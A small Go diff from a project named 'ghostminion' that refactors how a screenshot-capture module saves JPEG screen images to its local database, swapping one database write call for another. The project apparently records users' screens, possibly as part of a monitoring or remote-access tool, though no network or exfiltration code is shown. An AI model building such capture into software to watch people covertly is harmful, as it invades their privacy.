@@ -3,6 +3,7 @@ package apps
 import (
 	"bytes"
 	"ghostminion/db"
+	"ghostminion/db/dbDataTypes"
 	"github.com/kbinani/screenshot"
 	"image"
 	"image/jpeg"
@@ -57,7 +58,7 @@ func (c *ScreenshotApp) runScreenshot() {
 		if err != nil {
 			lgr.Error("Error encoding jpeg image: ", err)
 		}
-		err = db.WriteDataRow("", db.ScreenshotsDataType, buf.Bytes()) // replace requestId
+		err = db.WriteData("", dbDataTypes.Screenshots, buf.Bytes()) // replace requestId
 		if err != nil {
 			lgr.Error("Error writing file data: ", err)
 		}
